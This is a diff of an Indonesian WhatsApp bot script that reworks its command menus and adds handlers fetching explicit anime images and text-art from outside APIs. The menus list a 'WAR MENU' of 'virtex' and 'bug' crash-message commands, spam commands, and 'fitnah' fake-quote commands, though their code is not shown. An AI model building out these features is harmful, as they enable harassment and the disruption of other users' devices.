-├ ${prefix}bugtroli2 [ _jumlah_ ]
-├ ${prefix}bugpc
-├ ${prefix}bugcombine
-├ ${prefix}bugtroli
-├ ${prefix}buglokasi
-├ ${prefix}bughole
-├ ${prefix}leave
-├ ${prefix}restart
-├ ${prefix}join [ _link group_ ]
-├ ${prefix}addrespon [ _tanya|jawab_ ]
-└ ${prefix}delrespon [ _nama_ ]`
+│◦➛${prefix}autorespon [ on/off ]
+│◦➛${prefix}bc [ teks/reply gif/image/video with caption ]
+│◦➛${prefix}tobc [ reply sticker/audio with caption ]
+│◦➛${prefix}return [ javascript ]
+│◦➛${prefix}clearall
+│◦➛${prefix}delchat
+│◦➛${prefix}mute
+│◦➛${prefix}unmute
+│◦➛${prefix}public
+│◦➛${prefix}self
+│◦➛${prefix}spam [ teks|jumlah ]
+│◦➛${prefix}demoteall
+│◦➛${prefix}promoteall
+│◦➛${prefix}addcmd [ teks reply stc ]
+│◦➛${prefix}delcmd [ reply stc ]
+│◦➛${prefix}listcmd
+│◦➛${prefix}spamsw [ teks|jumlah ]
+│◦➛${prefix}upswteks [ teks ]
+│◦➛${prefix}upswlokasi [ teks ]
+│◦➛${prefix}upswaudio [ reply audio ]
+│◦➛${prefix}upswvoice [ reply audio ]
+│◦➛${prefix}upswsticker [ reply sticker ]
+│◦➛${prefix}upswimage [ reply image with caption ]
+│◦➛${prefix}upswgif [ reply gif with caption ]
+│◦➛${prefix}upswvideo [ reply video with caption ]
+│◦➛${prefix}shutdown
+│◦➛${prefix}offline [ alasan ]
+│◦➛${prefix}online
+│◦➛${prefix}exif [ nama|author ]
+│◦➛${prefix}setprofile [ reply image ]
+│◦➛${prefix}setname [ teks ]
+│◦➛${prefix}setprefix [ multi/nopref ]
+│◦➛${prefix}setbio [ teks ]
+│◦➛${prefix}leave
+│◦➛${prefix}restart
+│◦➛${prefix}join [ link group ]
+│◦➛${prefix}addrespon [ tanya|jawab ]
+│◦➛${prefix}delrespon [ nama ]
+│◦➛${prefix}q [ reply message ]
+│
+├─❒ WAR MENU
+│◦➛${prefix}virtex
+│◦➛${prefix}bugkatalog
+│◦➛${prefix}bugloc
+│◦➛${prefix}bugrow
+│◦➛${prefix}buglink
+│◦➛${prefix}bugbutton
+│◦➛${prefix}bug [ jumlah ]
+│◦➛${prefix}bugpc2 [ jumlah ]
+│◦➛${prefix}bugtroli2 [ jumlah ]
+│◦➛${prefix}bugtroli3
+│◦➛${prefix}bugpc
+│◦➛${prefix}bugcombine
+│◦➛${prefix}bugtroli
+│◦➛${prefix}buglokasi
+└${prefix}bughole`
 katalog(menu)
 break
 case 'downloadmenu':
 menu = `❏ 「 \`\`\`MENU DOWNLOAD\`\`\` 」
 ├────────────────────
-├ ${prefix}infogempa
-├ ${prefix}herolist
-├ ${prefix}herodetail [ _hero_ ]
-├ ${prefix}google [ _search_ ]
-├ ${prefix}gimage [ _search_ ]
-├ ${prefix}wiki [ _search_ ]
-├ ${prefix}mediafire [ _link_ ]
-├ ${prefix}ytsearch [ _judul_ ]
-├ ${prefix}ytmp4 [ _link yt_ ]
-├ ${prefix}ytmp3 [ _link yt_ ]
-├ ${prefix}play [ _judul lagu_ ]
-├ ${prefix}video [ _judul video_ ]
-├ ${prefix}tinyurl [ _link_ ]
-├ ${prefix}fetch [ _link_ ]
-├ ${prefix}igdl [ _link_ ]
-├ ${prefix}tiktokdl [ _link_ ]
-├ ${prefix}pinterest [ _search_ ]
-├ ${prefix}lirik [ _judul_ ]
-├ ${prefix}tourl [ _reply image/video_ ]
-├ ${prefix}resepmasakan [ _judul_ ]
-├ ${prefix}artimimpi [ _teks_ ]
-├ ${prefix}bilangangka [ _angka_ ]
-├ ${prefix}kalkulator [ _angka_ ]
-├ ${prefix}fancytext [ _teks_ ]
-├ ${prefix}githubstalk [ _username_ ]
-├ ${prefix}translate [ _kodebhs|teks_ ]
-└ ${prefix}ss [ _link_ ]`
+│◦➛${prefix}infogempa
+│◦➛${prefix}herolist
+│◦➛${prefix}herodetail [ hero ]
+│◦➛${prefix}google [ search ]
+│◦➛${prefix}gimage [ search ]
+│◦➛${prefix}wiki [ search ]
+│◦➛${prefix}mediafire [ link ]
+│◦➛${prefix}ytsearch [ judul ]
+│◦➛${prefix}ytmp4 [ link yt ]
+│◦➛${prefix}ytmp3 [ link yt ]
+│◦➛${prefix}play [ judul lagu ]
+│◦➛${prefix}video [ judul video ]
+│◦➛${prefix}tinyurl [ link ]
+│◦➛${prefix}fetch [ link ]
+│◦➛${prefix}igdl [ link ]
+│◦➛${prefix}tiktokdl [ link ]
+│◦➛${prefix}pinterest [ search ]
+│◦➛${prefix}lirik [ judul ]
+│◦➛${prefix}tourl [ reply image/video ]
+│◦➛${prefix}resepmasakan [ judul ]
+│◦➛${prefix}artimimpi [ teks ]
+│◦➛${prefix}bilangangka [ angka ]
+│◦➛${prefix}kalkulator [ angka ]
+│◦➛${prefix}fancytext [ teks ]
+│◦➛${prefix}githubstalk [ username ]
+│◦➛${prefix}translate [ kodebhs|teks ]
+│◦➛${prefix}ss [ link ]
+│◦➛${prefix}tiktokaudio [ link ]
+│◦➛${prefix}igstory [ link ]
+│◦➛${prefix}linkwa
+│◦➛${prefix}playstore [ query ]
+│◦➛${prefix}fb [ link ]
+└${prefix}twitter [ link ]`
 katalog(menu)
 break
 case 'makermenu':
 menu = `❏ 「 \`\`\`MENU MAKER\`\`\` 」
 ├────────────────────
-├ ${prefix}matrix [ _teks_ ]
-├ ${prefix}googletxt [ _teks_ ]
-├ ${prefix}spiderman [ _teks_ ]
-├ ${prefix}express [ _teks_ ]
-├ ${prefix}dance [ _teks_ ]
-├ ${prefix}blackbird [ _teks_ ]
-├ ${prefix}halloween [ _teks_ ]
-├ ${prefix}vampire [ _teks_ ]
-├ ${prefix}codetxt [ _teks_ ]
-├ ${prefix}text3d [ _teks_ ]
-└ ${prefix}warrior [ _teks_ ]`
+│◦➛${prefix}foliokiri 「 text 」
+│◦➛${prefix}foliokanan 「 text 」
+│◦➛${prefix}nuliskanan 「 text 」
+│◦➛${prefix}nuliskiri 「 text 」
+│◦➛${prefix}matrix [ teks ]
+│◦➛${prefix}googletxt [ teks ]
+│◦➛${prefix}spiderman [ teks ]
+│◦➛${prefix}express [ teks ]
+│◦➛${prefix}dance [ teks ]
+│◦➛${prefix}blackbird [ teks ]
+│◦➛${prefix}halloween [ teks ]
+│◦➛${prefix}vampire [ teks ]
+│◦➛${prefix}codetxt [ teks ]
+│◦➛${prefix}text3d [ teks ]
+│◦➛${prefix}warrior [ teks ]
+│◦➛${prefix}maker2d2 「 text 」
+│◦➛${prefix}maker2d3 「 text 」
+│◦➛${prefix}maker2d4 「 text 」
+│◦➛${prefix}maker3d 「 text 」
+│◦➛${prefix}maker3d2 「 text 」
+│◦➛${prefix}maker3d3 「 text 」
+│◦➛${prefix}maker3d4 「 text 」
+│◦➛${prefix}transformer 「 text 」
+│◦➛${prefix}googletxt 「 text 」
+│◦➛${prefix}battlefield 「 text 」
+│◦➛${prefix}coffeecup 「 text 」
+│◦➛${prefix}coffeecup2 「 text 」
+│◦➛${prefix}neon 「 text 」
+│◦➛${prefix}glow 「 text 」
+│◦➛${prefix}summer 「 text 」
+│◦➛${prefix}flower 「 text 」
+│◦➛${prefix}burn 「 text 」
+│◦➛${prefix}quote 「 text 」
+│◦➛${prefix}wooden 「 text 」
+└${prefix}golden 「 text 」 `
 katalog(menu)
 break
 case 'groupmenu':
 menu = `❏ 「 \`\`\`MENU GROUP\`\`\` 」
 ├────────────────────
-├ ${prefix}getpict [ _@tag_ ]
-├ ${prefix}getname [ _reply target_ ]
-├ ${prefix}getbio [ _reply target_ ]
-├ ${prefix}promote [ _@tag_ ]
-├ ${prefix}demote [ _@tag_ ]
-├ ${prefix}antilink [ _1/0_ ]
-├ ${prefix}creategrup [ _nama|@tag_ ]
-├ ${prefix}tictactoe [ _@tag_ ]
-├ ${prefix}delttt
-├ ${prefix}getpp
-├ ${prefix}kick [ _@tag_ ]
-├ ${prefix}add [ _nomor_ ]
-├ ${prefix}getdeskgc
-├ ${prefix}sider [ _reply pesan bot_ ]
-├ ${prefix}hacked [ _teks_ ]
-├ ${prefix}setnamegc [ _teks_ ]
-├ ${prefix}setdeskgc [ _teks_ ]
-├ ${prefix}fitnah [ _@tag|teks1|teks2_ ]
-├ ${prefix}kontak [ _@tag|nama_ ]
-├ ${prefix}kontag [ _@tag|nama_ ]
-├ ${prefix}opengc
-├ ${prefix}closegc
-├ ${prefix}resetlinkgc
-├ ${prefix}linkgrup
-├ ${prefix}hidetag [ _teks_ ]
-├ ${prefix}sticktag [ _nama sticker_ ]
-└ ${prefix}totag [ _reply media_ ]`
+│◦➛${prefix}getpict [ @tag ]
+│◦➛${prefix}getname [ reply target ]
+│◦➛${prefix}getbio [ reply target ]
+│◦➛${prefix}promote [ @tag ]
+│◦➛${prefix}demote [ @tag ]
+│◦➛${prefix}antilink [ 1/0 ]
+│◦➛${prefix}nsfw [ 1/0 ]
+│◦➛${prefix}creategrup [ nama|@tag ]
+│◦➛${prefix}tictactoe [ @tag ]
+│◦➛${prefix}delttt
+│◦➛${prefix}getpp
+│◦➛${prefix}kick [ @tag ]
+│◦➛${prefix}add [ nomor ]
+│◦➛${prefix}getdeskgc
+│◦➛${prefix}sider [ reply pesan bot ]
+│◦➛${prefix}hacked [ teks ]
+│◦➛${prefix}setnamegc [ teks ]
+│◦➛${prefix}setdeskgc [ teks ]
+│◦➛${prefix}fitnah [ @tag|teks1|teks2 ]
+│◦➛${prefix}kontak [ @tag|nama ]
+│◦➛${prefix}kontag [ @tag|nama ]
+│◦➛${prefix}opengc
+│◦➛${prefix}closegc
+│◦➛${prefix}resetlinkgc
+│◦➛${prefix}linkgrup
+│◦➛${prefix}hidetag [ teks ]
+│◦➛${prefix}sticktag [ nama sticker ]
+└${prefix}totag [ reply media ]`
+katalog(menu)
+break
+case 'nsfwmenu':
+menu =`❏ 「 \`\`\`MENU NSFW\`\`\` 」
+├────────────────────
+│◦➛${prefix}trapnime
+│◦➛${prefix}neko
+│◦➛${prefix}megumin
+│◦➛${prefix}blowjob
+│◦➛${prefix}hentai
+│◦➛${prefix}awoo
+│◦➛${prefix}bj 
+│◦➛${prefix}eroneko
+│◦➛${prefix}lesbian
+│◦➛${prefix}anal
+│◦➛${prefix}yuri
+│◦➛${prefix}baka
+│◦➛${prefix}neko2
+│◦➛${prefix}wallpaper
+│◦➛${prefix}pussy
+│◦➛${prefix}kitsune
+│◦➛${prefix}keta
+│◦➛${prefix}neko2
+│◦➛${prefix}poke
+│◦➛${prefix}slap
+│◦➛${prefix}komiku [ query ]
+│◦➛${prefix}otaku [ query ]
+└${prefix}chara [ query ]`
 katalog(menu)
 break
 case 'othermenu':
 menu = `❏ 「 \`\`\`MENU OTHER\`\`\` 」
 ├────────────────────
-├ ${prefix}jadibot
-├ ${prefix}caripesan [ _teks|jumlah_ ]
-├ ${prefix}slots
-├ ${prefix}suit [ _gunting/batu/kertas_ ]
-├ ${prefix}tag [ _nomor_ ]
-├ ${prefix}tagme
-├ ${prefix}tts [ _kodebhs teks_ ]
-├ ${prefix}readmore [ _teks1|teks2_ ]
-├ ${prefix}fitnahpc [ _nomor|teks1|teks2_ ]
-├ ${prefix}chat [ _nomor|teks_ ]
-├ ${prefix}fdeface [ _replyimg link|teks1|teks2_ ]
-├ ${prefix}listimage
-├ ${prefix}liststicker
-├ ${prefix}listvn
-├ ${prefix}listgrup
-├ ${prefix}baileys [ _reply message_ ]
-├ ${prefix}q [ _reply message_ ]
-├ ${prefix}getcaption [ _reply message_ ]
-├ ${prefix}pantun
-├ ${prefix}tospam [ _reply audio/sticker/image|jumlah_ ]
-├ ${prefix}sharelock [ _teks1|teks2_ ]
-├ ${prefix}sticker
-├ ${prefix}stickerwm [ _nama|author_ ]
-├ ${prefix}takestick [ _nama|author_ ]
-├ ${prefix}colong [ _reply sticker_ ]
-├ ${prefix}dadu
-├ ${prefix}semoji [ _emoji_ ]
-├ ${prefix}attp [ _teks_ ]
-├ ${prefix}toimg
-├ ${prefix}tomp3 [ _reply video_ ]
-├ ${prefix}tomp4 [ _reply sticker gif_ ]
-├ ${prefix}robot [ _reply audio_ ]
-├ ${prefix}balik [ _reply audio_ ]
-├ ${prefix}bass [ _reply audio_ ]
-├ ${prefix}gemuk [ _reply audio_ ]
-├ ${prefix}detikvn [ _reply audio caption angka_ ]
-└ ${prefix}detikvideo [ _reply video caption angka_ ]`
+│◦➛${prefix}getscmd
+│◦➛${prefix}stickerwm [ nama|author ]
+│◦➛${prefix}takestick [ nama|author ]
+│◦➛${prefix}colong [ reply sticker ]
+│◦➛${prefix}sticker
+│◦➛${prefix}semoji [ emoji ]
+│◦➛${prefix}attp [ teks ]
+│◦➛${prefix}toimg
+│◦➛${prefix}tomp3 [ reply video ]
+│◦➛${prefix}tomp4 [ reply sticker gif ]
+│◦➛${prefix}robot [ reply audio ]
+│◦➛${prefix}balik [ reply audio ]
+│◦➛${prefix}bass [ reply audio ]
+│◦➛${prefix}gemuk [ reply audio ]
+│◦➛${prefix}detikvn [ reply audio caption angka ]
+│◦➛${prefix}detikvideo [ reply video caption angka ]
+│◦➛${prefix}tts [ kodebhs teks ]
+│
+├─❒ STORAGE
+│◦➛${prefix}addsticker [ nama ]
+│◦➛${prefix}delsticker [ nama ]
+│◦➛${prefix}addvn [ nama ]
+│◦➛${prefix}delvn [ nama ]
+│◦➛${prefix}addimage [ nama ]
+│◦➛${prefix}delimage [ nama ]
+│◦➛${prefix}listimage
+│◦➛${prefix}liststicker
+│◦➛${prefix}listvn
+│
+├─❒ JADI BOT
+│◦➛${prefix}stopjadibot
+│◦➛${prefix}jadibot
+│
+├─❒ OTHER / FUN
+│◦➛${prefix}caripesan [ teks|jumlah ]
+│◦➛${prefix}slots
+│◦➛${prefix}suit [ gunting/batu/kertas ]
+│◦➛${prefix}tag [ nomor ]
+│◦➛${prefix}tagme
+│◦➛${prefix}readmore [ teks1|teks2 ]
+│◦➛${prefix}fitnahpc [ nomor|teks1|teks2 ]
+│◦➛${prefix}chat [ nomor|teks ]
+│◦➛${prefix}fdeface [ replyimg link|teks1|teks2 ]
+│◦➛${prefix}listgrup
+│◦➛${prefix}baileys [ reply message ]
+│◦➛${prefix}getcaption [ reply message ]
+│◦➛${prefix}pantun
+│◦➛${prefix}tospam [ reply audio/sticker/image|jumlah ]
+│◦➛${prefix}sharelock [ teks1|teks2 ]
+└${prefix}dadu`
 katalog(menu)
 break
+//Hardianto nsfw
+case 'yuri':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+kon = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=hardianto`)
+anu = await getBuffer(kon)
+denz.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'anal':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+aku = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=anal&apikey=hardianto`)
+kon = await getBuffer(aku)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'lesbian':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+kau = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=hardianto`)
+kon = await getBuffer(kau)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'eroneko':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'bj':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'kitsune':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'pussy':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=hardianto`)
+denz.sendMessage(from, hai, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'wallpaper':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'neko2':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'baka':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'slap':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'poke':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'neko2':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'keta':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=hardianto`)
+kon = await getBuffer(hai)
+denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case  'awoo':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
+buffer = await getBuffer(anu.url)
+denz.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case  'blowjob':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
+buffer = await getBuffer(anu.url)
+denz.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case  'hentai': 
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
+buffer = await getBuffer(anu.url)
+denz.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case  'megumin':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
+buffer = await getBuffer(anu.url)
+denz.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case  'neko':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
+buffer = await getBuffer(anu.url)
+denz.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case  'trapnime':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+reply(mess.wait)
+anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
+buffer = await getBuffer(anu.url)
+denz.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+//Done
+case 'nuliskiri':
+if (!c) return reply('Textnya mana gan?')
+reply(mess.wait)
+kon = (`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${c}&apikey=hardianto`)
+anu = await getBuffer(kon)
+denz.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'nuliskanan':
+if (!c) return reply('Textnya mana gan?')
+reply(mess.wait)
+kon = (`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=hardianto`)
+anu = await getBuffer(kon)
+denz.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'foliokanan':
+if (!c) return reply('Textnya mana gan?')
+reply(mess.wait)
+kon = (`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=hardianto`)
+anu = await getBuffer(kon)
+denz.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+case 'foliokiri':
+if (!c) return reply('Textnya mana gan?')
+reply(mess.wait)
+kon = (`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=hardianto`)
+anu = await getBuffer(kon)
+denz.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+break
+//Xchillds
+case 'maker2d2': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.results)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+		case 'maker2d3': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.results)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+		case 'maker2d4': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.results)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'maker3d': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = body.slice(8)
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.results)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'maker3d2': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.results)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'maker3d3': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.results)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'maker3d4': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.results)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'transformer': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.results)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'googletxt':
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa|chan|kawai`)
+					makell = args.join(" ")
+					ll1 = makell.split("|")[0];
+					ll2 = makell.split("|")[1];
+					ll3 = makell.split("|")[0];
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'battlefield': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu|Kamiyaka`)
+					makell = args.join(" ")
+					ll1 = makell.split("|")[0];
+					ll2 = makell.split("|")[1];
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'coffeecup': 
